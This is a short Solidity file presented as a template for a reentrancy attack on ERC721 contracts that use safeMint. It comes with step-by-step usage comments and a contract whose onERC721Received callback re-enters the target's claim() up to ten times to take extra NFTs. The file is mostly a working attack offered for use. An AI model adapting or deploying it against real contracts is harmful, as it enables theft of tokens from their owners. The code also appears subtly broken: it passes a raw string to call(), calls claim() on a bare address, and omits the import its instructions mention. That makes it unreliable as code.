
// Description:
// A template for a reentrancy attack on the vulnerable safeMint_ functionality of ERC721

// How to use:
// 1. Change the ./Target.sol import to the path to the code of your target
// 2. Implement additional functionalities / adapt the parameters
// 3. Deploy the contract and call attack();

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract exploiter {
    int claims;
    address NFT_contract;

    constructor(address target_addr)
    {
        claims = 0; 
        NFT_contract = target_addr;
    }

    function attack() payable public
    {
        NFT_contract.call("takeONEnft(bytes32)", bytes32(0x89cc2652e31add2270f7ce9c3c69ce903558b7a053665c92e066089aece0ccb6));
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4)
    {
        if (claims < 10)
        {
            claims += 1;
            NFT_contract.claim();
        }

        return this.onERC721Received.selector;
    }
}